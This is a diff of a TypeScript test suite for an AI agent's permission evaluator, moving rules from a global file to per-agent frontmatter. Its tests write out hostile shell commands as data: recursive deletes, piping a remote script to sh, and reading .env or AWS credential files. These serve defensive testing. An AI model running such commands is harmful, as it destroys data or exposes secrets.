@@ -3,18 +3,20 @@ import * as fs from "node:fs";
 import * as os from "node:os";
 import * as path from "node:path";
 import { fileURLToPath } from "node:url";
-import { describeCall, evaluate, normalizeDir, reloadAll, resolveGrantDir, resolveGrantPath, shortenHome, AGENT_BEATS_GLOBAL } from "./loader.ts";
+import { describeCall, evaluate, normalizeDir, reloadAll, resolveGrantDir, resolveGrantPath, shortenHome } from "./loader.ts";
 
-let tmpFiles: string[] = [];
 let tmpDirs: string[] = [];
 
-function writeTempJson(rules: any[], defaultAction = "ask"): string {
+/** Install an agent file (JSON-encoded frontmatter `permissions:` — valid
+ *  YAML flow style, no quoting pitfalls) and assume its identity. */
+function useAgent(rules: any[], defaultAction = "ask"): void {
 	const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-perm-test-"));
 	tmpDirs.push(dir);
-	const file = path.join(dir, "permissions.json");
-	fs.writeFileSync(file, JSON.stringify({ defaultAction, rules }));
-	tmpFiles.push(file);
-	return file;
+	const file = path.join(dir, "agent.md");
+	const perms = JSON.stringify({ defaultAction, rules });
+	fs.writeFileSync(file, `---\nname: test\npermissions: ${perms}\n---\nbody\n`);
+	process.env.PI_AGENT_FILE = file;
+	reloadAll();
 }
 
 function writeAgentFile(dir: string, name: string, frontmatter: string): string {
@@ -28,7 +30,7 @@ function writeAgentFile(dir: string, name: string, frontmatter: string): string 
 const savedEnv: Record<string, string | undefined> = {};
 
 beforeEach(() => {
-	for (const k of ["PI_PERMISSIONS_FILE", "PI_AGENT_NAME", "PI_AGENT_FILE"]) {
+	for (const k of ["PI_AGENT_NAME", "PI_AGENT_FILE"]) {
 		savedEnv[k] = process.env[k];
 		delete process.env[k];
 	}
@@ -36,35 +38,28 @@ beforeEach(() => {
 });
 
 afterEach(() => {
-	for (const k of ["PI_PERMISSIONS_FILE", "PI_AGENT_NAME", "PI_AGENT_FILE"]) {
+	for (const k of ["PI_AGENT_NAME", "PI_AGENT_FILE"]) {
 		if (savedEnv[k] === undefined) delete process.env[k];
 		else process.env[k] = savedEnv[k];
 	}
 	reloadAll();
 	for (const d of tmpDirs) fs.rmSync(d, { recursive: true, force: true });
 	tmpDirs = [];
-	tmpFiles = [];
 });
 
-describe("global rules (first-match)", () => {
+describe("agent rules (first-match)", () => {
 	test("deny segment blocks chained call", () => {
-		const f = writeTempJson([
+		useAgent([
 			{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b[^;&|$`<>\\n]*$", action: "allow" },
 			{ tool: "bash", match: "*rm -rf*", action: "deny" },
 		]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
 		// Per-segment first-match: "git status" allows, "rm -rf ..." denies → whole call denies.
 		const r = evaluate("bash", { command: "git status; rm -rf /tmp/x" }, "/tmp");
 		expect(r.action).toBe("deny");
-		expect(r.source).toBe("global");
+		expect(r.source).toBe("agent");
 	});
 	test("anchored allow permits plain args, chained falls to default", () => {
-		const f = writeTempJson([
-			{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b[^;&|$`<>\\n]*$", action: "allow" },
-		]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b[^;&|$`<>\\n]*$", action: "allow" }]);
 		expect(evaluate("bash", { command: "git status --short" }, "/tmp").action).toBe("allow");
 		expect(evaluate("bash", { command: "git status; id" }, "/tmp").action).toBe("ask");
 		expect(evaluate("bash", { command: "git status | head" }, "/tmp").action).toBe("ask");
@@ -73,23 +68,19 @@ describe("global rules (first-match)", () => {
 
 describe("shell chain evaluation (strict, per-segment)", () => {
 	test("all-allow chain passes silently", () => {
-		const f = writeTempJson([
+		useAgent([
 			{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b", action: "allow" },
 			{ tool: "bash", match: "re:^\\s*git\\s+(diff)\\b", action: "allow" },
 		]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
 		const r = evaluate("bash", { command: "git status && git diff" }, "/tmp");
 		expect(r.action).toBe("allow");
 		expect(r.segmentCount).toBe(2);
 	});
 	test("one deny segment blocks whole chain with segment index", () => {
-		const f = writeTempJson([
+		useAgent([
 			{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b", action: "allow" },
 			{ tool: "bash", match: "*rm -rf*", action: "deny" },
 		]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
 		const r = evaluate("bash", { command: "git status; rm -rf /tmp/x" }, "/tmp");
 		expect(r.action).toBe("deny");
 		expect(r.segmentCount).toBe(2);
@@ -97,33 +88,25 @@ describe("shell chain evaluation (strict, per-segment)", () => {
 		expect(r.segment).toContain("rm -rf");
 	});
 	test("allowed + unknown segment falls to ask", () => {
-		const f = writeTempJson([{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b", action: "allow" }]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b", action: "allow" }]);
 		const r = evaluate("bash", { command: "git status && id" }, "/tmp");
 		expect(r.action).toBe("ask");
 		expect(r.segmentCount).toBe(2);
 		expect(r.segmentIndex).toBe(1);
 	});
 	test("pipes split into segments", () => {
-		const f = writeTempJson([
+		useAgent([
 			{ tool: "bash", match: "re:^\\s*git\\s+(status)\\b", action: "allow" },
 			{ tool: "bash", match: "re:^\\s*head\\b", action: "allow" },
 		]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
 		expect(evaluate("bash", { command: "git status | head" }, "/tmp").action).toBe("allow");
 	});
 	test("powershell chains split like bash", () => {
-		const f = writeTempJson([{ tool: "powershell", match: "re:^\\s*git\\s+(status)\\b", action: "allow" }]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "powershell", match: "re:^\\s*git\\s+(status)\\b", action: "allow" }]);
 		expect(evaluate("powershell", { command: "git status; id" }, "/tmp").action).toBe("ask");
 	});
 	test("quoted delimiters do not create segments", () => {
-		const f = writeTempJson([{ tool: "bash", match: "re:^echo", action: "allow" }], "ask");
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "bash", match: "re:^echo", action: "allow" }], "ask");
 		// Whole command is one echo segment → allow, not split on quoted ";".
 		const r = evaluate("bash", { command: `echo "a; b"` }, "/tmp");
 		expect(r.action).toBe("allow");
@@ -133,77 +116,51 @@ describe("shell chain evaluation (strict, per-segment)", () => {
 
 describe("fail-closed invalid regex", () => {
 	test("broken deny blocks", () => {
-		const f = writeTempJson([{ tool: "bash", match: "re:([", action: "deny" }]);
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "bash", match: "re:([", action: "deny" }]);
 		const r = evaluate("bash", { command: "echo hello" }, "/tmp");
 		expect(r.action).toBe("deny");
 	});
 	test("broken allow never matches (falls through)", () => {
-		const f = writeTempJson([{ tool: "bash", match: "re:([", action: "allow" }], "ask");
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "bash", match: "re:([", action: "allow" }], "ask");
 		expect(evaluate("bash", { command: "echo hello" }, "/tmp").action).toBe("ask");
 	});
 });
 
 describe("path segment globs", () => {
 	test("src/* does not cross segments", () => {
-		const f = writeTempJson([{ tool: "read", match: "src/*", action: "deny" }], "allow");
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "read", match: "src/*", action: "deny" }], "allow");
 		expect(evaluate("read", { path: "src/a" }, "/repo").action).toBe("deny");
 		expect(evaluate("read", { path: "src/a/b" }, "/repo").action).toBe("allow");
 	});
 	test("** still crosses segments", () => {
-		const f = writeTempJson([{ tool: "read", match: "**/.env*", action: "deny" }], "allow");
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
+		useAgent([{ tool: "read", match: "**/.env*", action: "deny" }], "allow");
 		expect(evaluate("read", { path: "sub/.env.local" }, "/repo").action).toBe("deny");
 	});
 });
 
-describe("per-agent layer", () => {
-	test("precedence lock is intentional (agent beats global)", () => {
-		expect(AGENT_BEATS_GLOBAL).toBe(true);
+describe("agent layer (no global fallback)", () => {
+	test("subagent invocations target JSON args", () => {
+		useAgent([{ tool: "subagent", action: "allow" }], "ask");
+		const r = evaluate("subagent", { agent: "coder", task: "write x" }, "/repo");
+		expect(r.action).toBe("allow");
+		expect(r.source).toBe("agent");
 	});
-	test("subagent invocations target JSON args (parent gate, not inner action)", () => {
-		const f = writeTempJson([{ tool: "subagent", action: "allow" }], "ask");
-		process.env.PI_PERMISSIONS_FILE = f;
-		reloadAll();
-		// Parent gate: subagent tool itself is allowlisted; inner write/bash
-		// permissions are enforced separately in-child via PI_AGENT_NAME/FILE.
-		expect(evaluate("subagent", { agent: "coder", task: "write x" }, "/repo").action).toBe("allow");
-		expect(evaluate("subagent", { agent: "coder", task: "write x" }, "/repo").source).toBe("global");
-	});
-	test("agent allow beats global ask and global deny", () => {
-		const gf = writeTempJson(
-			[
-				{ tool: "read", match: "**/.env*", action: "deny" },
-				{ tool: "read", match: "**", action: "ask" },
-			],
-			"ask",
-		);
-		process.env.PI_PERMISSIONS_FILE = gf;
-		const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-agent-test-"));
-		tmpDirs.push(dir);
-		const agentFile = path.join(dir, "reviewer.md");
-		fs.writeFileSync(
-			agentFile,
-			`---\nname: reviewer\npermissions:\n  defaultAction: deny\n  rules:\n    - { tool: read, match: "**", action: allow }\n---\nbody\n`,
-		);
-		process.env.PI_AGENT_NAME = "reviewer";
-		process.env.PI_AGENT_FILE = agentFile;
-		reloadAll();
+	test("rules apply in order, explicit default catches the rest", () => {
+		useAgent([{ tool: "read", match: "**", action: "allow" }], "deny");
 		expect(evaluate("read", { path: "src/a.ts" }, "/repo").action).toBe("allow");
-		// Agent rules beat global deny: agent allow "**" re-allows .env.
-		expect(evaluate("read", { path: ".env" }, "/repo").action).toBe("allow");
-		// write has no agent rule + agent default deny
-		expect(evaluate("write", { path: "x.ts" }, "/repo").action).toBe("deny");
+		// write has no rule → agent default deny.
+		const w = evaluate("write", { path: "x.ts" }, "/repo");
+		expect(w.action).toBe("deny");
+		expect(w.source).toBe("agent");
+	});
+	test("scoped agent deny holds under default allow", () => {
+		useAgent([{ tool: "read", match: "**/.env*", action: "deny" }], "allow");
+		const r = evaluate("read", { path: ".env" }, "/repo");
+		expect(r.action).toBe("deny");
+		expect(r.source).toBe("agent");
+		expect(evaluate("read", { path: "src/a.ts" }, "/repo").action).toBe("allow");
 	});
 	test("name-only lookup finds project-local agent dir", () => {
-		const gf = writeTempJson([], "ask");
-		process.env.PI_PERMISSIONS_FILE = gf;
 		const root = fs.mkdtempSync(path.join(os.tmpdir(), "pi-proj-test-"));
 		tmpDirs.push(root);
 		writeAgentFile(root, "local", "name: local\npermissions:\n  defaultAction: deny\n  rules: []");
@@ -215,56 +172,27 @@ describe("per-agent layer", () => {
 		// Agent file sets explicit default deny (with an empty-rules warning path).
 		expect(evaluate("read", { path: "x" }, cwd).action).toBe("deny");
 	});
-	test("agent deny beats global allow", () => {
-		const gf = writeTempJson([{ tool: "read", match: "**", action: "allow" }], "allow");
-		process.env.PI_PERMISSIONS_FILE = gf;
+	test("agent file without permissions block falls back to ask", () => {
 		const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-agent-test-"));
 		tmpDirs.push(dir);
-		const agentFile = path.join(dir, "strict.md");
-		fs.writeFileSync(
-			agentFile,
-			`---\nname: strict\npermissions:\n  rules:\n    - { tool: read, match: "**/.env*", action: deny }\n---\nbody\n`,
-		);
-		process.env.PI_AGENT_NAME = "strict";
+		const agentFile = path.join(dir, "plain.md");
+		fs.writeFileSync(agentFile, `---\nname: plain\n---\nbody\n`);
 		process.env.PI_AGENT_FILE = agentFile;
 		reloadAll();
-		const r = evaluate("read", { path: ".env" }, "/repo");
-		expect(r.action).toBe("deny");
-		expect(r.source).toBe("agent");
-		expect(evaluate("read", { path: "src/a.ts" }, "/repo").action).toBe("allow");
+		const r = evaluate("read", { path: "x.ts" }, "/repo");
+		expect(r.action).toBe("ask");
+		expect(r.source).toBe("default");
 	});
-	test("agent allow beats global deny for bash", () => {
-		const gf = writeTempJson([{ tool: "bash", match: "*rm -rf*", action: "deny" }], "ask");
-		process.env.PI_PERMISSIONS_FILE = gf;
-		const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-agent-test-"));
-		tmpDirs.push(dir);
-		const agentFile = path.join(dir, "loose.md");
-		fs.writeFileSync(
-			agentFile,
-			`---\nname: loose\npermissions:\n  rules:\n    - { tool: bash, match: "*rm -rf*", action: allow }\n---\nbody\n`,
-		);
-		process.env.PI_AGENT_NAME = "loose";
-		process.env.PI_AGENT_FILE = agentFile;
+	test("main session without agent env falls back to ask", () => {
+		// beforeEach cleared PI_AGENT_NAME/FILE: policy is agents/main.md
+		// (default ask) or the hardcoded ask fallback — either way, ask.
+		delete process.env.PI_AGENT_NAME;
+		delete process.env.PI_AGENT_FILE;
 		reloadAll();
-		const r = evaluate("bash", { command: "rm -rf /tmp/x" }, "/tmp");
-		expect(r.action).toBe("allow");
-		expect(r.source).toBe("agent");
-	});
-	test("agent default beats global deny when no rule matches", () => {
-		const gf = writeTempJson([{ tool: "read", match: "**/.env*", action: "deny" }], "ask");
-		process.env.PI_PERMISSIONS_FILE = gf;
-		const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-agent-test-"));
-		tmpDirs.push(dir);
-		const agentFile = path.join(dir, "permissive.md");
-		fs.writeFileSync(agentFile, `---\nname: permissive\npermissions:\n  defaultAction: allow\n  rules: []\n---\nbody\n`);
-		process.env.PI_AGENT_NAME = "permissive";
-		process.env.PI_AGENT_FILE = agentFile;
-		reloadAll();
-		expect(evaluate("read", { path: ".env" }, "/repo").action).toBe("allow");
+		expect(evaluate("write", { path: "src/foo.ts" }, "/repo").action).toBe("ask");
+		expect(evaluate("bash", { command: "rm -rf /tmp/x" }, "/tmp").action).toBe("ask");
 	});
 	test("negative agent cache is not pinned (file created after miss)", () => {
-		const gf = writeTempJson([], "ask");
-		process.env.PI_PERMISSIONS_FILE = gf;
 		const root = fs.mkdtempSync(path.join(os.tmpdir(), "pi-neg-test-"));
 		tmpDirs.push(root);
 		const cwd = path.join(root, "work");
@@ -374,92 +302,11 @@ describe("describeCall structured tools", () => {
 	});
 });
 
-describe("hardened global policy (permissions.json, no agent)", () => {
-	function hardened(): string {
-		const text = fs.readFileSync(new URL("../../permissions.json", import.meta.url), "utf-8");
-		const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-hardened-"));
-		tmpDirs.push(dir);
-		const file = path.join(dir, "permissions.json");
-		fs.writeFileSync(file, text);
-		return file;
-	}
-	beforeEach(() => {
-		process.env.PI_PERMISSIONS_FILE = hardened();
-		delete process.env.PI_AGENT_NAME;
-		delete process.env.PI_AGENT_FILE;
-		reloadAll();
-	});
-	test("recursive rm denied even without -f; plain rm allows", () => {
-		expect(evaluate("bash", { command: "rm -r /tmp/x" }, "/tmp").action).toBe("deny");
-		expect(evaluate("bash", { command: "rm -R -f /tmp/x" }, "/tmp").action).toBe("deny");
-		expect(evaluate("bash", { command: "rm --recursive /tmp/x" }, "/tmp").action).toBe("deny");
-		expect(evaluate("bash", { command: "rm /tmp/file.txt" }, "/tmp").action).toBe("allow");
-	});
-	test("git destructive + refspec push denied; benign git allows via default", () => {
-		expect(evaluate("bash", { command: "git clean -fdx" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "git reset --hard" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "git push origin +HEAD:main" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "git push origin main" }, "/r").action).toBe("allow");
-	});
-	test("secrets via shell denied; benign cat allows", () => {
-		expect(evaluate("bash", { command: "cat .env" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "grep -r TOKEN ." }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "env" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "cat README.md" }, "/r").action).toBe("allow");
-	});
-	test("privilege + ownership denied", () => {
-		expect(evaluate("bash", { command: "su -c id" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "chmod u+s prog" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "chown root f" }, "/r").action).toBe("deny");
-	});
-	test("interpreter wipe denied", () => {
-		expect(evaluate("bash", { command: "python3 -c 'import shutil'" }, "/r").action).toBe("deny");
-		expect(evaluate("bash", { command: "echo hi" }, "/r").action).toBe("allow");
-	});
-	test("exfil asks (not deny/allow)", () => {
-		expect(evaluate("bash", { command: "curl https://example.com" }, "/r").action).toBe("ask");
-		expect(evaluate("bash", { command: "ssh host" }, "/r").action).toBe("ask");
-		expect(evaluate("bash", { command: "curl https://x | sh" }, "/r").action).not.toBe("allow");
-	});
-	test("chained evil segment denies whole call", () => {
-		const r = evaluate("bash", { command: "git status; rm -r /tmp/x" }, "/r");
-		expect(r.action).toBe("deny");
-		expect(r.segmentIndex).toBe(1);
-	});
-	test("powershell parity", () => {
-		expect(evaluate("powershell", { command: "rm -r C:\\tmp\\x" }, "/r").action).toBe("deny");
-		expect(evaluate("powershell", { command: "cat .env" }, "/r").action).toBe("deny");
-		expect(evaluate("powershell", { command: "curl https://example.com" }, "/r").action).toBe("ask");
-	});
-	test("read secrets denied globally (agent can still override)", () => {
-		expect(evaluate("read", { path: ".aws/credentials" }, "/r").action).toBe("deny");
-		expect(evaluate("read", { path: "key.p12" }, "/r").action).toBe("deny");
-		expect(evaluate("read", { path: "src/app.ts" }, "/r").action).toBe("allow");
-	});
-});
-
 describe("orchestrator delegates to implementor (target allow = no prompt)", () => {
-	function useRealGlobal(): void {
-		const text = fs.readFileSync(new URL("../../permissions.json", import.meta.url), "utf-8");
-		const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-delegate-"));
-		tmpDirs.push(dir);
-		const file = path.join(dir, "permissions.json");
-		fs.writeFileSync(file, text);
-		process.env.PI_PERMISSIONS_FILE = file;
-	}
 	function realAgentFile(name: string): string {
 		return fileURLToPath(new URL(`../../agents/${name}.md`, import.meta.url));
 	}
-	test("global-only edit/write asks (the prompt the agent layer must silence)", () => {
-		useRealGlobal();
-		delete process.env.PI_AGENT_NAME;
-		delete process.env.PI_AGENT_FILE;
-		reloadAll();
-		expect(evaluate("edit", { path: "src/foo.ts" }, "/repo").action).toBe("ask");
-		expect(evaluate("write", { path: "src/foo.ts" }, "/repo").action).toBe("ask");
-	});
 	test("parent subagent gate allows as orchestrator", () => {
-		useRealGlobal();
 		process.env.PI_AGENT_NAME = "orchestrator";
 		process.env.PI_AGENT_FILE = realAgentFile("orchestrator");
 		reloadAll();
@@ -468,7 +315,6 @@ describe("orchestrator delegates to implementor (target allow = no prompt)", () 
 		expect(r.source).toBe("agent");
 	});
 	test("child edit/write allow as implementor (no prompt forwarded to parent)", () => {
-		useRealGlobal();
 		process.env.PI_AGENT_NAME = "code-production-implementor";
 		process.env.PI_AGENT_FILE = realAgentFile("code-production-implementor");
 		reloadAll();
@@ -480,7 +326,6 @@ describe("orchestrator delegates to implementor (target allow = no prompt)", () 
 		expect(write.source).toBe("agent");
 	});
 	test("implementor test-path deny still holds in-child", () => {
-		useRealGlobal();
 		process.env.PI_AGENT_NAME = "code-production-implementor";
 		process.env.PI_AGENT_FILE = realAgentFile("code-production-implementor");
 		reloadAll();
